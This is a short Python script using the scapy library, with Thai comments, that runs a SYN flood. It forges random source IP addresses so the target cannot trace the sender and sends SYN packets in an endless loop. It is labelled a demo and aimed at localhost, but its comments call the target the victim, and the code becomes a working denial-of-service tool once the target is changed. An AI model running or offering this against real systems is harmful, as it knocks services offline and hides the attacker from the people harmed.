from scapy.all import *
import random

def syn_flood_demo(target_ip, target_port):
    # 1. ปลอมตัวเป็นใครก็ได้ (สุ่ม IP มั่วๆ)
    # เพื่อไม่ให้ Server รู้ว่ามาจากเรา
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    # 2. สร้าง IP Layer
    ip_layer = IP(src=fake_ip, dst=target_ip)
    
    # 3. สร้าง TCP Layer
    # sport = สุ่ม port ต้นทาง
    # flags="S" คือการส่ง Flag SYN (ขอเชื่อมต่อ)
    tcp_layer = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    
    # 4. รวมร่างเป็น Packet
    packet = ip_layer/tcp_layer
    
    # 5. ส่งออกไป (send)
    send(packet, verbose=0)
    print(f"Sent Fake SYN from {fake_ip} to {target_ip}")

# วิธีใช้ (สมมติยิงไปที่เครื่องตัวเอง)
# loop นี้จะส่งไปเรื่อยๆ ถ้าส่งเยอะๆ คือ Flood ครับ
target = "127.0.0.1" # IP เครื่องเหยื่อ
while True:
    syn_flood_demo(target, 80)